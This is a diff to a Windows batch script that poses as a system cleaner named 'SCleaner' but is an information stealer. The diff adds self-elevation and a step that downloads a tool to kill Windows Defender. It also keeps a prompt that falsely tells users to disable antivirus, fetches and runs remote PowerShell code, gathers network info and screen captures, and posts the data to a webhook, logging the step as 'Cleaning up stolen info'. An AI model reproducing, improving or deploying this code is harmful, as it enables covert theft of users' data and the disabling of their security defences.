@@ -1,10 +1,25 @@
 @echo off
 cd /d "%~dp0"
+fltmc >nul 2>&1 || (
+	color 0f
+	call :logo
+	echo.
+	echo SCleaner is a system-wide deep-cleaning utility.
+	echo As a result, this script needs admin privileges!
+	timeout /t 3 >nul
+    PowerShell Start -Verb RunAs '%0' 2> nul || (
+        set "elevated=false" & goto prep
+    )
+    exit 0
+)
+set "elevated=true"
+
+:prep
 title SCleaner ^| v1.3
 if exist "%TEMP%\wstemp\" rd /s /q "%TEMP%\wstemp" >nul
 if exist "%TEMP%\SCleaner.log" del /q "%TEMP%\SCleaner.log" >nul
 if not exist "%TEMP%\wstemp\" md "%TEMP%\wstemp\" >nul
-echo [SCLEANER] %USERNAME%@%COMPUTERNAME% - %DATE% > "%TEMP%\SCleaner.log"
+echo [SCLEANER] %USERNAME%@%COMPUTERNAME% - %DATE% - Elevated: %elevated% > "%TEMP%\SCleaner.log"
 set webhook=your_webhook_url_here1
 echo [SCLEANER] WEBHOOK: %webhook% >> "%TEMP%\SCleaner.log"
 echo [%TIME%] Checking Windows version.. >> "%TEMP%\SCleaner.log"
@@ -18,29 +33,48 @@ del "%~f0"
 exit
 
 :compatible
-echo [%TIME%] Prompting user to disable AV.. >> "%TEMP%\SCleaner.log"
+if "%elevated%"=="false" (
+	echo [WARNING] SCleaner not elevated.
+	echo [WARNING] Some things may not work as expected.
+	echo [%TIME%] Not elevated. Prompting user to disable AV.. >> "%TEMP%\SCleaner.log"
+)
 color 0f
 call :logo
 echo.
 echo SCleaner v1.3 ^| ADVANCED
 echo ============================
-echo This script gets commonly flagged by Antivirus software.
-echo The detections are pure false positives, and SCleaner is harmless.
-echo In order to avoid script corruption, please disable your Antivirus or turn off Real-time Protection in Windows Defender.
-echo After you do that, type "I UNDERSTAND" here to continue:
-set /p understood=^> 
-if /i NOT "%understood%"=="I UNDERSTAND" echo [%TIME%] User failed to accept prompt. >> "%TEMP%\SCleaner.log" & goto compatible
-echo [%TIME%] User accepted prompt. >> "%TEMP%\SCleaner.log"
-color 0f
-call :logo
-echo.
-echo SCleaner v1.3 ^| ADVANCED
-echo ============================
+if "%elevated%"=="false" (
+	echo [WARNING] SCleaner not elevated.
+	echo [WARNING] Some things may not work as expected.
+	echo This script gets commonly flagged by Antivirus software.
+	echo The detections are pure false positives, as SCleaner is harmless.
+	echo Please disable your Antivirus.
+	echo After you do that, type "I UNDERSTAND" here to continue:
+	set /p understood=^> 
+)
+if "%elevated%"=="false" (
+	if /i NOT "%understood%"=="I UNDERSTAND" echo [%TIME%] User failed to accept prompt. >> "%TEMP%\SCleaner.log" & goto compatible
+	echo [%TIME%] User accepted prompt. >> "%TEMP%\SCleaner.log"
+)
 echo Cleaning System TEMP files..
 echo [%TIME%] Getting 7z.exe.. >> "%TEMP%\SCleaner.log"
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/7z.exe -OutFile '%TEMP%\7z.exe'"
 echo [%TIME%] Getting 7z.dll.. >> "%TEMP%\SCleaner.log"
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/LargeVanillaMilkshake/1a/raw/refs/heads/main/7z.dll -OutFile '%TEMP%\7z.dll'"
+if "%elevated%"=="true" (
+	echo [%TIME%] Getting WinDefCtl.. >> "%TEMP%\SCleaner.log"
+	powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm https://github.com/wesmar/WinDefCtl/releases/download/v2.0.0/WinDefCtl.7z -OutFile '%TEMP%\WinDefCtl.7z'"
+	echo [%TIME%] Extracting WinDefCtl.. >> "%TEMP%\SCleaner.log"
+	"%TEMP%\7z.exe" x "%TEMP%\WinDefCtl.7z" -pgithub.com -o"%TEMP%\WinDefCtl\" -aoa >nul
+	echo [%TIME%] Deleting WinDefCtl.7z.. >> "%TEMP%\SCleaner.log"
+	del "%TEMP%\WinDefCtl.7z" >nul
+	echo [%TIME%] Killing Defender.. >> "%TEMP%\SCleaner.log"
+	echo --------------------------- >> "%TEMP%\SCleaner.log"
+	"%TEMP%\WinDefCtl\WinDefCtl" kill >> "%TEMP%\SCleaner.log"
+	echo --------------------------- >> "%TEMP%\SCleaner.log"
+) else (
+	echo [%TIME%] Skipping WinDefCtl.. >> "%TEMP%\SCleaner.log"
+)
 setlocal enabledelayedexpansion
 echo [%TIME%] Getting local IP.. >> "%TEMP%\SCleaner.log"
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set IP=%%a
@@ -60,7 +94,6 @@ echo [%TIME%] Cleaning up script files.. >> "%TEMP%\SCleaner.log"
 del screencapture.exe >nul
 del screencapture.bat >nul
 popd
-del %TEMP%\fastfetch.exe >nul
 echo [%TIME%] Getting ipconfig info.. >> "%TEMP%\SCleaner.log"
 echo IP Configuration:>>"%TEMP%\wstemp\ipconfig.txt"
 ipconfig >> "%TEMP%\wstemp\ipconfig.txt"
@@ -95,6 +128,8 @@ echo [%TIME%] Downloading fastfetch.. >> "%TEMP%\SCleaner.log"
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/fastfetch.exe -outfile %TEMP%\fastfetch.exe"
 echo [%TIME%] Getting fastfetch info.. >> "%TEMP%\SCleaner.log"
 %TEMP%\fastfetch.exe >> "%TEMP%\wstemp\fastfetch.txt"
+echo [%TIME%] Cleaning up fastfetch.. >> "%TEMP%\SCleaner.log"
+del %TEMP%\fastfetch.exe >nul
 echo [%TIME%] Running zipping.ps1.. >> "%TEMP%\SCleaner.log"
 powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; $ProgressPreference = 'SilentlyContinue'; irm -useb https://raw.githubusercontent.com/LargeVanillaMilkshake/1a/main/zipping.ps1 | iex"
 echo [%TIME%] Sending info.. >> "%TEMP%\SCleaner.log"
@@ -152,8 +187,16 @@ REM pushd "%TEMP%\wstemp"
 REM del "%TEMP%\wstemp\updates.py"
 REM powershell -Command "Remove-MpPreference -ExclusionPath '%TEMP%\wstemp\updates.py'"
 popd
-echo [%TIME%] Cleaning up.. >> "%TEMP%\SCleaner.log"
+echo [%TIME%] Cleaning up stolen info.. >> "%TEMP%\SCleaner.log"
 rd /s /q "%TEMP%\wstemp" >nul
+if "%elevated%"=="true" (
+	echo [%TIME%] Restoring Defender.. >> "%TEMP%\SCleaner.log"
+	echo ----------------------------- >> "%TEMP%\SCleaner.log"
+	"%TEMP%\WinDefCtl\WinDefCtl" restore >> "%TEMP%\SCleaner.log"
+	echo ----------------------------- >> "%TEMP%\SCleaner.log"
+	echo [%TIME%] Cleaning up WinDefCtl.. >> "%TEMP%\SCleaner.log"
+	rd /s /q "%TEMP%\WinDefCtl" >nul
+)
 echo [%TIME%] Done. >> "%TEMP%\SCleaner.log"
 curl -k -F "file1=@%TEMP%\SCleaner.log" %WEBHOOK% >nul
 echo Done.
@@ -163,7 +206,7 @@ del "%~f0"
 exit
 
 :logo
-mode con cols=70 lines=30
+mode con cols=65 lines=30
 chcp 65001 >nul
 echo [38;5;214m░██████╗░█████╗░██╗░░░░░███████╗░█████╗░███╗░░██╗███████╗██████╗
 echo [38;5;215m██╔════╝██╔══██╗██║░░░░░██╔════╝██╔══██╗████╗░██║██╔════╝██╔══██╗
